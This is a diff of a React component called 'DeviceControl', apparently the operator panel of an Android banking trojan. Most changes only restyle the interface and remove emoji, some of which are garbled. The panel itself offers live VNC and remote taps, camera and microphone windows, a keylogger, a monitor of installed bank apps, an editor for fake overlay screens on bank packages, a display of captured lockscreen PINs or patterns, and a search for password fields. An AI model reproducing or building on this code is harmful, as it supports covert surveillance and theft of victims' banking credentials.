             return updated;
           });
           setShowBankVisualEditor(false);
-          addLog(`💾 Tela do banco editada com sucesso!`);
+          addLog(` Tela do banco editada com sucesso!`);
         }}
         onApply={(updatedTemplate) => {
           applyCustomBlackScreen(updatedTemplate, editBankPackage);
@@ -11465,7 +11544,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         initialTemplate={bankScreens.find(s => s.id === selectedPresetScreenId)}
       />
       
-      {/* 🔒 Editor Visual de Telas de Sistema */}
+      {/*  Editor Visual de Telas de Sistema */}
       <BlackScreenEditor
         isOpen={showSystemVisualEditor}
         onClose={() => setShowSystemVisualEditor(false)}
@@ -11476,7 +11555,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             return updated;
           });
           setShowSystemVisualEditor(false);
-          addLog(`💾 Tela de sistema editada com sucesso!`);
+          addLog(` Tela de sistema editada com sucesso!`);
         }}
         onApply={(updatedTemplate) => {
           applyCustomBlackScreen(updatedTemplate, editSystemPackage);
@@ -11489,33 +11568,33 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         <div className="fixed inset-0 bg-slate-950/45 backdrop-blur-sm z-40 overflow-hidden pointer-events-none">
           {/* Background ambient radial glow */}
           <div className="absolute inset-0 bg-[radial-gradient(circle_at_30%_20%,rgba(239,68,68,0.1),transparent_45%)] pointer-events-none" />
-          <div className="absolute inset-0 bg-[radial-gradient(circle_at_80%_70%,rgba(220,38,38,0.1),transparent_45%)] pointer-events-none" />
+          <div className="absolute inset-0 bg-[radial-gradient(circle_at_80%_70%,rgba(239,68,68,0.1),transparent_45%)] pointer-events-none" />
 
           {/* Toolbar de Janelas */}
-          <div className="fixed top-0 left-0 right-0 bg-[#3d0c04]/95 backdrop-blur-xl border-b border-cyan-500/30 px-4 py-2.5 z-50 flex items-center justify-between shadow-[0_4px_25px_rgba(0,0,0,0.5)] pointer-events-auto">
+          <div className="fixed top-0 left-0 right-0 bg-[#3d0c04]/95 backdrop-blur-xl border-b border-[#2a2a31]/30 px-4 py-2.5 z-50 flex items-center justify-between shadow-[0_4px_25px_rgba(0,0,0,0.5)] pointer-events-auto">
             <div className="flex items-center space-x-3">
-              <span className="px-2.5 py-1 rounded-xl bg-gradient-to-r from-blue-600 via-cyan-600 to-teal-500 text-white font-black text-xs uppercase tracking-wider shadow-[0_0_15px_rgba(239,68,68,0.4)]">
+              <span className="px-2.5 py-1 rounded-md bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-teal-500 text-[#10120a] font-black text-xs uppercase tracking-wider shadow-[0_0_15px_rgba(239,68,68,0.4)]">
                 🪟 MODO FLUTUANTE HUD VIP
               </span>
               
               {/* Presets Inovadores de Organização de Tela */}
-              <div className="flex items-center space-x-2 pl-2 border-l border-cyan-500/30">
+              <div className="flex items-center space-x-2 pl-2 border-l border-[#2a2a31]/30">
                 <button
                   onClick={organizeCockpitLayout}
-                  className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl text-xs font-black shadow-[0_0_15px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 font-mono cursor-pointer"
+                  className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-black shadow-[0_0_15px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 font-mono cursor-pointer"
                   title="Alinha VNC Normal + Screen Reader V2 + Controles perfeitamente lado a lado"
                 >
                   <LayoutGrid className="w-4 h-4 text-emerald-200" />
-                  ⚡ Cockpit VNC + V2
+                   Cockpit VNC + V2
                 </button>
 
                 <button
                   onClick={autoOrganizeAllFloatingWindows}
-                  className="px-3 py-1.5 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-500 hover:to-blue-500 text-white rounded-xl text-xs font-bold border border-blue-400/30 transition-all flex items-center gap-1 font-mono cursor-pointer"
+                  className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold border border-[#3a3a44]/30 transition-all flex items-center gap-1 font-mono cursor-pointer"
                   title="Organiza todas as janelas abertas lado a lado sem sobreposição"
                 >
-                  <Maximize2 className="w-3.5 h-3.5 text-cyan-300" />
-                  “ Auto-Organizar
+                  <Maximize2 className="w-3.5 h-3.5 text-[#ef4444]" />
+                   Auto-Organizar
                 </button>
               </div>
             </div>
@@ -11524,13 +11603,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             <div className="flex items-center space-x-1.5 overflow-x-auto text-xs">
               <button
                 onClick={() => toggleWindow('vnc')}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.vnc.open 
-                    ? 'bg-gradient-to-r from-blue-600 to-cyan-500 text-white shadow-[0_0_12px_rgba(220,38,38,0.4)] border border-cyan-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                📺 VNC V1
+                 VNC V1
               </button>
               <button
                 onClick={() => {
@@ -11539,23 +11618,23 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     toggleScreenReader();
                   }
                 }}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.screenReader.open 
-                    ? 'bg-gradient-to-r from-cyan-600 to-teal-500 text-white shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-cyan-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-teal-500 text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                ‘ Screen V2
+                 Screen V2
               </button>
               <button
                 onClick={() => toggleWindow('controls')}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.controls.open 
-                    ? 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white shadow-[0_0_12px_rgba(220,38,38,0.4)] border border-blue-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                Ž› Controles
+                Ž Controles
               </button>
               <button
                 onClick={() => {
@@ -11564,13 +11643,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     toggleCamera();
                   }
                 }}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.camera.open 
                     ? 'bg-gradient-to-r from-teal-600 to-emerald-500 text-white shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-teal-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                📷 Cmera
+                 Cmera
               </button>
               <button
                 onClick={() => {
@@ -11579,30 +11658,30 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     toggleMicrophone();
                   }
                 }}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.microphone.open 
-                    ? 'bg-gradient-to-r from-cyan-600 to-blue-600 text-white shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-cyan-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                🎤 Mic
+                 Mic
               </button>
               <button
                 onClick={() => toggleWindow('keylogger')}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.keylogger.open 
                     ? 'bg-gradient-to-r from-amber-600 to-yellow-500 text-white shadow-[0_0_12px_rgba(245,158,11,0.4)] border border-amber-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
                 ¨ Keylogger
               </button>
               <button
                 onClick={() => setShowBankMonitorTab(true)}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   showBankMonitorTab
-                    ? 'bg-gradient-to-r from-orange-600 to-red-500 text-white shadow-[0_0_12px_rgba(249,115,22,0.4)] border border-orange-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_12px_rgba(249,115,22,0.4)] border border-[#f87171]/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
                  Bancos {installedBanks.length > 0 && `(${installedBanks.length})`}
@@ -11612,29 +11691,29 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   toggleWindow('editBankScreens');
                   selectPreset(selectedPresetScreenId);
                 }}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.editBankScreens.open 
-                    ? 'bg-gradient-to-r from-pink-600 to-rose-500 text-white shadow-[0_0_12px_rgba(236,72,153,0.4)] border border-pink-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#65a30d] to-[#ef4444] text-white shadow-[0_0_12px_rgba(236,72,153,0.4)] border border-pink-400/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
                  Editar Telas
               </button>
               <button
                 onClick={() => toggleWindow('lockscreen')}
-                className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                   floatingWindows.lockscreen.open 
-                    ? 'bg-gradient-to-r from-red-600 to-rose-600 text-white shadow-[0_0_12px_rgba(225,29,72,0.4)] border border-rose-400/40' 
-                    : 'bg-slate-900/80 text-slate-400 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-[#84cc16] text-[#10120a] shadow-[0_0_12px_rgba(225,29,72,0.4)] border border-rose-400/40' 
+                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                 }`}
               >
-                🔒 Lockscreen {(capturedPin || capturedPattern) && '✓'}
+                 Lockscreen {(capturedPin || capturedPattern) && ''}
               </button>
               
-              <div className="border-l border-blue-500/25 pl-2 ml-1">
+              <div className="border-l border-[#2a2a31]/25 pl-2 ml-1">
                 <button
                   onClick={() => setIsFloatingMode(false)}
-                  className="px-3.5 py-1.5 bg-red-650/80 hover:bg-red-600 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_10px_rgba(239,68,68,0.3)] transition-all flex items-center gap-1"
+                  className="px-3.5 py-1.5 bg-red-650/80 hover:bg-[#ef4444] text-white rounded-md text-xs font-black uppercase tracking-wider shadow-[0_0_10px_rgba(239,68,68,0.3)] transition-all flex items-center gap-1"
                 >
                   <X className="w-3.5 h-3.5" /> Sair
                 </button>
@@ -11656,17 +11735,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('vnc')}
               onDrag={(x, y) => updateWindowPosition('vnc', x, y)}
               onResize={(w, h) => updateWindowSize('vnc', w, h)}
-              headerColor="bg-gradient-to-r from-blue-700 via-cyan-600 to-blue-800"
+              headerColor="bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#24242a]"
             >
               <div className="h-full bg-[#1e0603] flex flex-col overflow-hidden">
                 {/* Status bar top */}
-                <div className="flex items-center justify-between px-3 py-1 bg-[#320a03] border-b border-cyan-500/20 shrink-0">
-                  <span className="text-[10px] font-mono font-bold text-cyan-400">📺 VNC AO VIVO</span>
+                <div className="flex items-center justify-between px-3 py-1 bg-[#320a03] border-b border-[#2a2a31]/20 shrink-0">
+                  <span className="text-[10px] font-mono font-bold text-[#ef4444]"> VNC AO VIVO</span>
                   <div className="flex items-center gap-1.5">
                     <div className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></div>
                     <span className="text-[9px] font-mono text-emerald-400">Transmitindo</span>
                   </div>
-                  <span className="text-[9px] font-mono text-cyan-400">100% 🔋</span>
+                  <span className="text-[9px] font-mono text-[#ef4444]">100% </span>
                 </div>
 
                 {/* VNC Screen filling rest of window */}
@@ -11683,21 +11762,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     />
                   ) : (
                     <div className="text-center p-6">
-                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400 mx-auto mb-3"></div>
-                      <p className="text-xs font-bold text-cyan-300 mb-3">VNC Não Iniciado</p>
+                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#3a3a44] mx-auto mb-3"></div>
+                      <p className="text-xs font-bold text-[#ef4444] mb-3">VNC Não Iniciado</p>
                       <button
                         onClick={toggleCapture}
-                        className="px-4 py-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-bold rounded-xl text-xs shadow-[0_0_12px_rgba(239,68,68,0.4)] transition-all"
+                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-xs shadow-[0_0_12px_rgba(239,68,68,0.4)] transition-all"
                       >
-                        –¶ Iniciar VNC
+                        ¶ Iniciar VNC
                       </button>
                     </div>
                   )}
                 </div>
 
                 {/* Bottom nav bar */}
-                <div className="flex items-center justify-center py-1 bg-[#320a03] border-t border-cyan-500/20 shrink-0">
-                  <div className="w-24 h-1 bg-cyan-400/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
+                <div className="flex items-center justify-center py-1 bg-[#320a03] border-t border-[#2a2a31]/20 shrink-0">
+                  <div className="w-24 h-1 bg-[#ef4444]/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
                 </div>
               </div>
             </FloatingWindow>
@@ -11714,47 +11793,47 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('screenReader')}
               onDrag={(x, y) => updateWindowPosition('screenReader', x, y)}
               onResize={(w, h) => updateWindowSize('screenReader', w, h)}
-              headerColor="bg-gradient-to-r from-cyan-700 via-blue-700 to-indigo-800"
+              headerColor="bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#24242a]"
             >
               <div className="h-full bg-[#1e0603] flex flex-col overflow-hidden select-none">
-                {/* ›  BARRA DE FERRAMENTAS & EDI‡ƒO RPIDA V2 (AZUL CIANO NEON) */}
-                <div className="bg-[#360b03] border-b border-cyan-500/30 px-3 py-1.5 flex items-center justify-between gap-2 shrink-0 text-xs">
+                {/*   BARRA DE FERRAMENTAS & EDIƒO RPIDA V2 (AZUL CIANO NEON) */}
+                <div className="bg-[#360b03] border-b border-[#2a2a31]/30 px-3 py-1.5 flex items-center justify-between gap-2 shrink-0 text-xs">
                   <div className="flex items-center gap-1.5">
                     <button
                       onClick={() => setShowV2Inspector(!showV2Inspector)}
-                      className={`px-2.5 py-1 rounded-lg font-bold flex items-center gap-1 transition-all ${
+                      className={`px-2.5 py-1 rounded-md font-bold flex items-center gap-1 transition-all ${
                         showV2Inspector
-                          ? 'bg-cyan-500 text-black shadow-[0_0_10px_rgba(239,68,68,0.5)]'
-                          : 'bg-blue-900/60 text-cyan-300 hover:bg-blue-800 border border-cyan-500/30'
+                          ? 'bg-[#ef4444] text-black shadow-[0_0_10px_rgba(239,68,68,0.5)]'
+                          : 'bg-[#1a1a1e]/60 text-[#ef4444] hover:bg-[#24242a] border border-[#2a2a31]/30'
                       }`}
                       title="Ver e inspecionar lista de elementos detectados na tela"
                     >
                       <Eye className="w-3.5 h-3.5" />
-                      <span>{showV2Inspector ? 'Fechar Inspetor' : '‘ Inspecionar Elementos'}</span>
+                      <span>{showV2Inspector ? 'Fechar Inspetor' : ' Inspecionar Elementos'}</span>
                     </button>
                     
                     <button
                       onClick={() => setV2DesignTheme(v2DesignTheme === 'cyan' ? 'matrix' : 'cyan')}
-                      className="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-lg text-[11px] font-mono border border-cyan-500/20"
+                      className="px-2 py-1 bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] rounded-md text-[11px] font-mono border border-[#2a2a31]/20"
                     >
-                      🎨 {v2DesignTheme === 'cyan' ? 'Tema Azul/Ciano' : 'Tema Matrix'}
+                       {v2DesignTheme === 'cyan' ? 'Tema Azul/Ciano' : 'Tema Matrix'}
                     </button>
                   </div>
 
                   <div className="flex items-center gap-2">
                     <button
                       onClick={() => setV2HideUntypedElements(!v2HideUntypedElements)}
-                      className={`px-2 py-1 rounded-lg text-[10px] font-bold ${
-                        v2HideUntypedElements ? 'bg-amber-600/80 text-white' : 'bg-slate-800 text-slate-400'
+                      className={`px-2 py-1 rounded-md text-[10px] font-bold ${
+                        v2HideUntypedElements ? 'bg-amber-600/80 text-white' : 'bg-[#24242a] text-slate-400'
                       }`}
                     >
-                      {v2HideUntypedElements ? '™ˆ Ocultando Vazios' : '‘ Mostrar Todos'}
+                      {v2HideUntypedElements ? 'ˆ Ocultando Vazios' : ' Mostrar Todos'}
                     </button>
-                    <div className="flex items-center gap-1 bg-slate-900 px-2 py-0.5 rounded-lg border border-cyan-500/20 text-[10px]">
+                    <div className="flex items-center gap-1 bg-[#121214] px-2 py-0.5 rounded-md border border-[#2a2a31]/20 text-[10px]">
                       <span className="text-gray-400">Zoom:</span>
-                      <button onClick={() => setV2TextScale(prev => Math.max(0.6, prev - 0.1))} className="text-cyan-400 font-bold hover:text-white px-1">-</button>
-                      <span className="text-cyan-300 font-mono">{(v2TextScale * 100).toFixed(0)}%</span>
-                      <button onClick={() => setV2TextScale(prev => Math.min(2.0, prev + 0.1))} className="text-cyan-400 font-bold hover:text-white px-1">+</button>
+                      <button onClick={() => setV2TextScale(prev => Math.max(0.6, prev - 0.1))} className="text-[#ef4444] font-bold hover:text-white px-1">-</button>
+                      <span className="text-[#ef4444] font-mono">{(v2TextScale * 100).toFixed(0)}%</span>
+                      <button onClick={() => setV2TextScale(prev => Math.min(2.0, prev + 0.1))} className="text-[#ef4444] font-bold hover:text-white px-1">+</button>
                     </div>
                   </div>
                 </div>
@@ -11764,7 +11843,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   {/*  MOLDURA DE CELULAR DA TELA V2 (SEM ESPAÇOS PRETOS NAS LATERAIS) */}
                   <div className="flex-1 h-full flex items-center justify-center p-0.5 overflow-hidden">
                     <div 
-                      className="relative bg-gradient-to-b from-slate-900 via-[#320a03] to-slate-950 rounded-[34px] p-1.5 shadow-[0_0_25px_rgba(239,68,68,0.35)] border border-cyan-500/40 flex flex-col h-full overflow-hidden select-none"
+                      className="relative bg-gradient-to-b from-[#121214] via-[#320a03] to-slate-950 rounded-[34px] p-1.5 shadow-[0_0_25px_rgba(239,68,68,0.35)] border border-[#2a2a31]/40 flex flex-col h-full overflow-hidden select-none"
                       style={{
                         aspectRatio: `${(screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH)} / ${(screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT)}`,
                         maxHeight: '100%'
@@ -11772,16 +11851,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     >
                       {/* Top Island / Camera Notch */}
                       <div className="w-full flex items-center justify-between px-3 pt-1 pb-1 shrink-0">
-                        <span className="text-[10px] font-mono font-bold text-cyan-400">12:00</span>
-                        <div className="flex items-center gap-1.5 px-2.5 py-0.5 bg-black/90 rounded-full border border-cyan-500/40 shadow-[0_0_8px_rgba(239,68,68,0.3)]">
-                          <div className="w-2 h-2 bg-cyan-400 rounded-full animate-pulse"></div>
-                          <div className="w-6 h-1 bg-slate-800 rounded-full"></div>
+                        <span className="text-[10px] font-mono font-bold text-[#ef4444]">12:00</span>
+                        <div className="flex items-center gap-1.5 px-2.5 py-0.5 bg-black/90 rounded-full border border-[#2a2a31]/40 shadow-[0_0_8px_rgba(239,68,68,0.3)]">
+                          <div className="w-2 h-2 bg-[#ef4444] rounded-full animate-pulse"></div>
+                          <div className="w-6 h-1 bg-[#24242a] rounded-full"></div>
                         </div>
-                        <span className="text-[9px] font-mono text-cyan-400">Screen V2</span>
+                        <span className="text-[9px] font-mono text-[#ef4444]">Screen V2</span>
                       </div>
 
                       {/* Canvas da Tela V2 Real */}
-                      <div className="relative bg-black rounded-[22px] overflow-hidden border border-cyan-500/20 flex-1 w-full flex items-center justify-center">
+                      <div className="relative bg-black rounded-[22px] overflow-hidden border border-[#2a2a31]/20 flex-1 w-full flex items-center justify-center">
                         {screenHierarchy ? (
                           <div 
                             className="relative cursor-crosshair w-full h-full flex items-center justify-center"
@@ -11846,15 +11925,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               
                               if (holdTime > 500 && distance < 10) {
                                 sendCommand({ action: 'LONG_PRESS', x: normX, y: normY, scale: 'vnc_norm' });
-                                addLog(`• Long Press: (${deviceDownX}, ${deviceDownY})`);
+                                addLog(` Long Press: (${deviceDownX}, ${deviceDownY})`);
                               }
                               else if (distance > 30) {
                                 sendCommand({ action: 'SWIPE', x1: normX1, y1: normY1, x2: normX2, y2: normY2, scale: 'vnc_norm' });
-                                addLog(`👉 Swipe: (${deviceDownX},${deviceDownY}) → (${deviceUpX},${deviceUpY})`);
+                                addLog(` Swipe: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                               }
                               else {
                                 sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
-                                addLog(`–± Click: (${deviceDownX}, ${deviceDownY})`);
+                                addLog(`± Click: (${deviceDownX}, ${deviceDownY})`);
                               }
                               
                               setMouseDownPos(null);
@@ -11879,9 +11958,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             />
                           </div>
                         ) : (
-                          <div className="h-full flex items-center justify-center text-cyan-400">
+                          <div className="h-full flex items-center justify-center text-[#ef4444]">
                             <div className="text-center p-4">
-                              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-cyan-400 mx-auto mb-2"></div>
+                              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#3a3a44] mx-auto mb-2"></div>
                               <p className="text-xs font-mono">Aguardando dados da Tela V2...</p>
                             </div>
                           </div>
@@ -11890,48 +11969,48 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                       {/* Bottom Bar */}
                       <div className="w-full flex items-center justify-center pt-1.5 pb-0.5 shrink-0">
-                        <div className="w-24 h-1 bg-cyan-400/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
+                        <div className="w-24 h-1 bg-[#ef4444]/60 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.6)]"></div>
                       </div>
                     </div>
                   </div>
 
-                  {/* ” PAINEL LATERAL INSPETOR E EDITOR DE ELEMENTOS DA TELA V2 */}
+                  {/*  PAINEL LATERAL INSPETOR E EDITOR DE ELEMENTOS DA TELA V2 */}
                   {showV2Inspector && (
-                    <div className="w-80 bg-[#2e0903] rounded-2xl border border-cyan-500/30 flex flex-col overflow-hidden shadow-2xl shrink-0">
+                    <div className="w-80 bg-[#2e0903] rounded-md border border-[#2a2a31]/30 flex flex-col overflow-hidden shadow-2xl shrink-0">
                       {/* Cabeçalho do Inspetor */}
-                      <div className="bg-[#420e05] px-3 py-2 border-b border-cyan-500/30 flex items-center justify-between">
-                        <span className="font-bold text-xs text-cyan-300 flex items-center gap-1.5 font-mono">
-                          <Eye className="w-4 h-4 text-cyan-400" />
+                      <div className="bg-[#420e05] px-3 py-2 border-b border-[#2a2a31]/30 flex items-center justify-between">
+                        <span className="font-bold text-xs text-[#ef4444] flex items-center gap-1.5 font-mono">
+                          <Eye className="w-4 h-4 text-[#ef4444]" />
                           Elementos da Tela V2
                         </span>
-                        <span className="px-2 py-0.5 bg-cyan-950 text-cyan-400 text-[10px] font-mono rounded-full border border-cyan-500/30">
+                        <span className="px-2 py-0.5 bg-[#121214] text-[#ef4444] text-[10px] font-mono rounded-full border border-[#2a2a31]/30">
                           {visibleV2Nodes.length} itens
                         </span>
                       </div>
 
                       {/* Aba de Categorias: Todos, Botões, Inputs, Textos */}
-                      <div className="grid grid-cols-4 gap-1 p-1 bg-[#1e0603] border-b border-cyan-500/20 text-[10px] font-mono shrink-0">
+                      <div className="grid grid-cols-4 gap-1 p-1 bg-[#1e0603] border-b border-[#2a2a31]/20 text-[10px] font-mono shrink-0">
                         <button
                           type="button"
                           onClick={() => setV2InspectorCategory('all')}
                           className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                             v2InspectorCategory === 'all'
-                              ? 'bg-cyan-500 text-black shadow-md'
-                              : 'bg-slate-900 text-slate-400 hover:text-white'
+                              ? 'bg-[#ef4444] text-black shadow-md'
+                              : 'bg-[#121214] text-slate-400 hover:text-white'
                           }`}
                         >
-                          ⚡ Todos
+                           Todos
                         </button>
                         <button
                           type="button"
                           onClick={() => setV2InspectorCategory('buttons')}
                           className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                             v2InspectorCategory === 'buttons'
-                              ? 'bg-blue-600 text-white shadow-md'
-                              : 'bg-slate-900 text-slate-400 hover:text-white'
+                              ? 'bg-[#ef4444] text-white shadow-md'
+                              : 'bg-[#121214] text-slate-400 hover:text-white'
                           }`}
                         >
-                          👆 Botões
+                           Botões
                         </button>
                         <button
                           type="button"
@@ -11939,18 +12018,18 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                             v2InspectorCategory === 'inputs'
                               ? 'bg-amber-600 text-white shadow-md'
-                              : 'bg-slate-900 text-slate-400 hover:text-white'
+                              : 'bg-[#121214] text-slate-400 hover:text-white'
                           }`}
                         >
-                          “ Inputs
+                           Inputs
                         </button>
                         <button
                           type="button"
                           onClick={() => setV2InspectorCategory('texts')}
                           className={`py-1 rounded text-center font-bold transition-all cursor-pointer ${
                             v2InspectorCategory === 'texts'
-                              ? 'bg-purple-600 text-white shadow-md'
-                              : 'bg-slate-900 text-slate-400 hover:text-white'
+                              ? 'bg-[#84cc16] text-white shadow-md'
+                              : 'bg-[#121214] text-slate-400 hover:text-white'
                           }`}
                         >
                            Textos
@@ -11958,13 +12037,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       </div>
 
                       {/* Busca / Filtro de Elementos */}
-                      <div className="p-2 border-b border-cyan-500/20 bg-[#200603]">
+                      <div className="p-2 border-b border-[#2a2a31]/20 bg-[#200603]">
                         <input
                           type="text"
-                          placeholder="” Buscar botão, input, senha..."
+                          placeholder=" Buscar botão, input, senha..."
                           value={v2SearchTerm}
                           onChange={(e) => setV2SearchTerm(e.target.value)}
-                          className="w-full px-2.5 py-1.5 bg-[#380c04] border border-cyan-500/30 rounded-xl text-xs text-white placeholder-slate-400 focus:outline-none focus:border-cyan-400 font-mono"
+                          className="w-full px-2.5 py-1.5 bg-[#380c04] border border-[#2a2a31]/30 rounded-md text-xs text-white placeholder-slate-400 focus:outline-none focus:border-[#3a3a44] font-mono"
                         />
                       </div>
 
@@ -11996,24 +12075,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               key={idx}
                               onMouseEnter={() => setHoveredNode(node)}
                               onMouseLeave={() => setHoveredNode(null)}
-                              className={`p-2 rounded-xl text-xs transition-all border ${
+                              className={`p-2 rounded-md text-xs transition-all border ${
                                 hoveredNode === node
-                                  ? 'bg-cyan-950/80 border-cyan-400 shadow-[0_0_12px_rgba(239,68,68,0.4)]'
+                                  ? 'bg-[#121214]/80 border-[#3a3a44] shadow-[0_0_12px_rgba(239,68,68,0.4)]'
                                   : isPass
-                                  ? 'bg-red-950/30 border-red-500/30 hover:border-red-400'
+                                  ? 'bg-[#121214]/30 border-[#2a2a31]/30 hover:border-[#3a3a44]'
                                   : isBtn
-                                  ? 'bg-blue-950/40 border-blue-500/30 hover:border-cyan-400'
-                                  : 'bg-[#360b04] border-cyan-500/15 hover:border-cyan-500/40'
